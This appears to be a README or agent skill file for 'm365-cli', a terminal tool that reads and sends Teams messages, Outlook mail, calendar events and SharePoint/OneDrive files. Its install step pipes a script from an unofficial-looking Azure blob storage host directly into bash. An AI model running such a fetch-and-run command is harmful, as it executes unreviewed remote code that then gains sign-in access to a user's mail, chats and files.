# m365-cli — Microsoft 365 CLI

A command-line tool for accessing Microsoft 365 services directly from the terminal.

## Prerequisites

1. **Install**: `curl -fsSL https://stttthreeai024313688509.blob.core.windows.net/m365cli/install.sh | bash`
2. **Login**: `m365 login` (opens browser for Microsoft Entra ID sign-in)
3. **Verify**: `m365 status`

## Usage Pattern

```
m365 <service> <action> [key=value ...] [--json]
```

**Always use `--json` for programmatic access.** Parse the JSON output to extract data.

Use `m365 <service> <action> --help` for detailed parameter info on any listed action.

## Services & Actions

### teams — Microsoft Teams (23 listed actions + 1 hidden compatibility action)
| Action | Parameters | Description |
|--------|-----------|-------------|
| `list-teams` | **userId** (GUID, required) | List Teams the user belongs to |
| `get-team` | **teamId** (required) | Get details of a specific team |
| `list-channels` | **teamId** (required), select, filter | List channels in a team |
| `get-channel` | **teamId**, **channelId** (required) | Get details of a specific channel |
| `create-channel` | **teamId**, **displayName** (required), description | Create a new channel |
| `create-private-channel` | **teamId**, **displayName**, **owner** (required) | Create a private channel |
| `update-channel` | **teamId**, **channelId** (required), displayName, description | Update channel properties |
| `list-channel-members` | **teamId**, **channelId** (required) | List members of a channel |
| `add-channel-member` | **teamId**, **channelId**, **userId** (required) | Add a member to a channel |
| `update-channel-member` | **teamId**, **channelId**, **membershipId**, **role** (required) | Update a channel member's role |
| `list-channel-messages` | **teamId**, **channelId** (required), top, expand | List messages in a channel |
| `post-channel-message` | **teamId**, **channelId**, **content** (required) | Post a message to a channel |
| `reply-to-channel-message` | **teamId**, **channelId**, **messageId**, **content** (required) | Reply to a channel message |
| `get-chat` | **chatId** (required) | Get details of a specific chat |
| `create-chat` | **chatType**, **members_upns** (JSON array, required), topic | Create a new chat |
| `update-chat` | **chatId** (required), topic | Update chat properties |
| `list-chat-members` | **chatId** (required) | List members of a chat |
| `add-chat-member` | **chatId**, **userId** (required) | Add a member to a chat |
| `list-chat-messages-all` | **chatId**, **range** (required, e.g. 2h/7d/30m) | Fetch all messages in a chat within a time range (handles pagination automatically) |
| `get-chat-message` | **chatId**, **messageId** (required) | Get a specific chat message |
| `post-message` | **chatId**, **content** (required) | Send a message to a chat |
| `update-chat-message` | **chatId**, **messageId**, **content** (required) | Update a chat message |
| `send-message-to-self` | **content** (required), contentType | Send a message to yourself |
| `search-teams-messages` | **message** (required), conversationId | Natural language search across Teams messages |

`list-chat-messages` remains functional for compatibility but is intentionally hidden from help/docs. Prefer `list-chat-messages-all`.

### mail — Outlook Mail (21 actions)
| Action | Parameters | Description |
|--------|-----------|-------------|
| `search-messages` | **message** (required), conversationId | Natural language email search (may take ~30s) |
| `get-message` | **id** (required), preferHtml, bodyPreviewOnly | Get a specific email by ID |
| `create-draft-message` | **subject**, **body**, **toRecipients** (required) | Create a draft email |
| `update-draft` | **messageId** (required) | Update a draft email |
| `send-draft-message` | **id** (required) | Send a draft email |
| `send-email-with-attachments` | **subject**, **body**, **toRecipients** (required), localFiles, directAttachments, attachmentUris | Send email with attachments |
| `delete-message` | **id** (required) | Delete an email |
| `update-message` | **id** (required) | Update email properties |
| `flag-email` | **messageId**, **flagStatus** (required), mailboxAddress | Flag an email for follow-up |
| `reply-to-message` | **id**, **comment** (required) | Reply to sender |
| `reply-all-to-message` | **id**, **comment** (required) | Reply to all recipients |
| `reply-with-full-thread` | **messageId**, **comment** (required) | Reply with full conversation |
| `reply-all-with-full-thread` | **messageId**, **comment** (required) | Reply all with full conversation |
| `forward-message` | **messageId**, **additionalTo** (required), introComment | Forward an email |
| `forward-message-with-full-thread` | **messageId**, **additionalTo** (required), introComment | Forward with full conversation |
| `get-attachments` | **messageId** (required) | List email attachments |
| `download-attachment` | **messageId**, **attachmentId** (required) | Download an attachment |
| `add-draft-attachments` | **messageId** (required) | Add attachments to draft |
| `upload-attachment` | **messageId** (required) | Upload attachment to email |
| `upload-large-attachment` | **messageId** (required) | Upload large attachment (>4MB) |
| `delete-attachment` | **messageId**, **attachmentId** (required) | Delete an attachment |

### calendar — Outlook Calendar (13 actions)
| Action | Parameters | Description |
|--------|-----------|-------------|
| `list-events` | startDateTime, endDateTime, meetingTitle, attendeeEmails, timeZone, top, orderby, select | List calendar events (master events for recurring) |
| `list-calendar-view` | userIdentifier, startDateTime, endDateTime, subject, timeZone, top, orderby, select | List events in date range (expands recurring) |
| `create-event` | **subject**, **startDateTime**, **endDateTime** (required), attendees, body, isOnlineMeeting, location, timeZone | Create a new event |
| `update-event` | **eventId** (required), subject, startDateTime, endDateTime | Update an existing event |
| `delete-event-by-id` | **eventId** (required) | Delete a calendar event |
| `accept-event` | **eventId** (required), comment, sendResponse | Accept a meeting invite |
| `decline-event` | **eventId** (required), comment, sendResponse | Decline a meeting invite |
| `tentatively-accept-event` | **eventId** (required), comment, sendResponse | Tentatively accept a meeting |
| `cancel-event` | **eventId** (required), comment | Cancel a meeting you organized |
| `forward-event` | **eventId**, **toRecipients** (required), comment | Forward an event |
| `find-meeting-times` | **attendees** (required), meetingDuration, timeConstraint | Find available meeting slots |
| `get-rooms` | *(none)* | Get available meeting rooms |
| `get-user-date-and-time-zone-settings` | *(none)* | Get user timezone settings |

### me — User Profile (5 actions)
| Action | Parameters | Description |
|--------|-----------|-------------|
| `get-my-details` | *(none)* | Get current user's profile |
| `get-user-details` | **userIdentifier** (required, email/GUID/name) | Get another user's profile |
| `get-multiple-users-details` | **searchValues** (JSON array, required) | Get multiple users' profiles |
| `get-manager-details` | **userId** (GUID, required) | Get manager's profile |
| `get-direct-reports-details` | **userId** (GUID, required) | Get direct reports' profiles |

### files — OneDrive & SharePoint Files (17 actions)
| Action | Parameters | Description |
|--------|-----------|-------------|
| `find-site` | searchQuery | Find SharePoint sites (omit query to list top 20) |
| `list-document-libraries` | siteId | List document libraries (drives) in a site |
| `get-default-document-library` | siteId | Get the default document library in a site |
| `get-folder-children` | **documentLibraryId** (required), parentFolderId | List top 20 files/folders in a folder |
| `find-file-or-folder` | **searchQuery** (required) | Search files/folders across all accessible sites |
| `get-file-or-folder-metadata` | **documentLibraryId**, **fileOrFolderId** (required) | Get file/folder metadata |
| `get-file-or-folder-metadata-by-url` | **fileOrFolderUrl** (required) | Get metadata from a sharing URL |
| `read-small-text-file` | **documentLibraryId**, **fileId** (required) | Read a text file (<5MB) |
| `read-small-binary-file` | **documentLibraryId**, **fileId** (required) | Read a binary file (<5MB) as base64 |
| `create-small-text-file` | **documentLibraryId**, **filename**, **contentText** (required), parentfolderId | Create a text file (<5MB) |
| `create-small-binary-file` | **documentLibraryId**, **filename**, **base64Content** (required), parentfolderId | Create a binary file (<5MB) |
| `upload-file-from-url` | **sourceUrl**, **destinationDocumentLibraryId** (required), destinationFolderId, filename | Upload file from SharePoint/OneDrive URL |
| `create-folder` | **documentLibraryId**, **folderName** (required), parentFolderId | Create a new folder |
| `delete-file-or-folder` | **documentLibraryId**, **fileOrFolderId** (required), etag | Delete a file or folder |
| `rename-file-or-folder` | **documentLibraryId**, **fileOrFolderId**, **newFileOrFolderName** (required), etag | Rename a file or folder |
| `move-small-file` | **documentLibraryId**, **fileId**, **newParentFolderId** (required), etag | Move a file (<5MB, same site) |
| `copy-file-or-folder` | **sourcedoclibid**, **sourcefileid**, **destdoclibid**, **destfolderid** (required), newfilename | Copy file/folder (async, cross-drive) |

## Favorites System

The CLI has a local favorites store (`m365 fav`) that caches frequently-used IDs for contacts, chats, channels, and sites. **Always check favorites first** — it eliminates multi-step ID lookups.

### Favorites commands
```bash
m365 fav list --json          # List all favorites (contacts, chats, channels, sites)
m365 fav get <query> --json   # Search favorites by alias, name, or other fields
m365 fav add <type> ...       # Add a favorite
m365 fav remove <alias>       # Remove a favorite
m365 fav sync                 # Sync favorites with OneDrive backup
```

### Favorite entry types and stored fields
| Type | Key Fields | Used For |
|------|-----------|----------|
| contact | alias, upn, name, user_id, **chat_id** | Direct messaging, user lookup |
| chat | alias, **chat_id**, topic | Group chat access |
| channel | alias, **team_id**, **channel_id**, team_name, channel_name | Channel messaging |
| site | alias, **site_id**, site_name | SharePoint file operations |

## Common Workflows

### Favorites-first: the fast path

**IMPORTANT:** Before any operation that needs an ID (chatId, teamId, channelId, siteId, userId), check favorites first with `m365 fav get <name> --json`. This gives you the ID instantly, skipping multi-step lookups.

#### Send a message to a favorite contact (1 step instead of 3)
```bash
# Old way: get-my-details → create-chat → post-message (3 API calls)
# Fast way: fav already has chat_id
m365 fav get alex --json
# → Returns chat_id directly, then:
m365 teams post-message chatId="<chat_id-from-fav>" content="Hey!" --json
```

#### Read messages from a favorite chat
```bash
m365 fav get project-alpha --json
# → Returns chat_id, then:
m365 teams list-chat-messages-all chatId="<chat_id>" range=2h --json
```

#### Post to a favorite channel
```bash
m365 fav get design-review --json
# → Returns team_id + channel_id, then:
m365 teams post-channel-message teamId="<team_id>" channelId="<channel_id>" content="Update..." --json
```

#### Browse files on a favorite site
```bash
m365 fav get marketing --json
# → Returns site_id, then:
m365 files list-document-libraries siteId="<site_id>" --json
```

#### Look up a favorite contact's profile
```bash
m365 fav get alex --json
# → Returns upn, then:
m365 me get-user-details userIdentifier="<upn>" --json
```

### Message summarization

Summarize messages from a specific chat/person or across all favorites.

#### Summarize a specific chat or person
```bash
# 1. Get the chat_id from favorites
m365 fav get <alias> --json

# 2. Fetch all messages within a time range (handles pagination automatically)
m365 teams list-chat-messages-all chatId="<chat_id>" range=2h --json

# 3. Summarize the returned messages
```

#### Summarize all favorite chats and channels
```bash
# 1. List all favorites
m365 fav list --json
# Filter for type=chat and type=channel entries

# 2. For each favorite CHAT — fetch all messages in time range
m365 teams list-chat-messages-all chatId="<chat_id>" range=2h --json

# 3. For each favorite CHANNEL — fetch messages then filter locally
#    NOTE: Channel messages do NOT support $filter. Fetch with top= and
#    filter by createdDateTime/lastModifiedDateTime in your code.
m365 teams list-channel-messages teamId="<team_id>" channelId="<channel_id>" \
  top=50 --json
# Then filter messages where createdDateTime >= start-time in code

# 4. Aggregate and summarize all messages
```

### Other common workflows

#### Get your user ID (needed for some operations)
```bash
m365 me get-my-details --json
# Extract userId from the JSON response
```

#### Search Teams messages
```bash
m365 teams search-teams-messages message="conversations about hackathon" --json
```

#### Find or create a chat
```bash
# create-chat is idempotent — returns existing chat if one exists
m365 teams create-chat chatType=oneOnOne members_upns='["person@contoso.com"]' --json
```

#### Search and read emails
```bash
m365 mail search-messages message="emails from manager about quarterly review" --json
m365 mail get-message id="AAMkADA..." --json
m365 mail get-message id="AAMkADA..." preferHtml=true --json
```

#### Manage calendar
```bash
m365 calendar list-events startDateTime=2026-03-21T00:00:00 endDateTime=2026-03-22T00:00:00 --json
m365 calendar list-calendar-view startDateTime=2026-03-21 endDateTime=2026-03-28 --json
m365 calendar list-events meetingTitle="standup" --json
m365 calendar find-meeting-times attendees='["user@contoso.com"]' meetingDuration=PT30M --json
```

#### Get user info
```bash
m365 me get-my-details --json
m365 me get-user-details userIdentifier="user@contoso.com" --json
```

#### OneDrive/SharePoint files
```bash
# Find a site (returns siteId in Graph format: "hostname,siteCollectionId,webId")
m365 files find-site searchQuery="Team Site" --json

# List document libraries (IMPORTANT: siteId must be full Graph format, NOT a URL)
m365 files list-document-libraries siteId="<site-id>" --json

# Browse, search, read files
m365 files get-folder-children documentLibraryId="<drive-id>" --json
m365 files find-file-or-folder searchQuery="quarterly report" --json
m365 files read-small-text-file documentLibraryId="<drive-id>" fileId="<file-id>" --json

# OneDrive for Business: use find-file-or-folder to discover your driveId
# (find-site does NOT return personal OneDrive)
m365 files find-file-or-folder searchQuery="<any-file>" --json
# → parentReference.driveId in results = your OneDrive documentLibraryId
```

## Email Attachments

`send-email-with-attachments` supports three attachment methods:

| Parameter | Use For | Example |
|-----------|---------|---------|
| `localFiles` | **Local files** (recommended) — auto-reads and base64-encodes | `localFiles='["/path/to/report.pptx"]'` |
| `directAttachments` | Inline base64 content (PascalCase keys) | `directAttachments='[{"FileName":"doc.txt","ContentBase64":"SGVsbG8=","ContentType":"text/plain"}]'` |
| `attachmentUris` | M365 file URIs (OneDrive/SharePoint) | `attachmentUris='["https://..."]'` |

**Use `localFiles` for local file attachments** — it handles base64 encoding and MIME type detection automatically. Max ~3.7MB per file (base64 expands to ~5MB limit).

```bash
# Send with a local file attachment
m365 mail send-email-with-attachments to='["user@contoso.com"]' \
  subject="Report" body="See attached" \
  localFiles='["/path/to/report.pptx"]' --json
```

## Important Notes

- **Always use `--json`** when calling from scripts or as an agent — this gives structured JSON output
- **Arguments are key=value pairs** — no `--` prefix for action arguments
- **JSON values** can be passed with single quotes: `attendees='["a@m.com"]'`
- **Stdin support**: pipe JSON via `--stdin` for complex payloads
- **Parameter names are camelCase** — match exactly as shown (e.g. `userUpns`, `chatId`, `startDateTime`)
- If a command fails with "Not logged in", run `m365 login` first
- Use `m365 <service> <action> --help` to see detailed parameters for any listed action
- Use `m365 <service> --help` to see the visible actions for a service

## Error Handling

- **"Not logged in"** → Run `m365 login`
- **HTTP 401** → Token expired, the CLI will auto-refresh. If it persists, run `m365 login`
- **HTTP 403** → Check that your account has the required license
- **HTTP 504** → Server timeout, try again or reduce result set (use `top` parameter)
- **"Unknown action"** → Run `m365 <service> --help` to see valid actions
- **"Missing required parameter"** → Run `m365 <service> <action> --help` to see required parameters
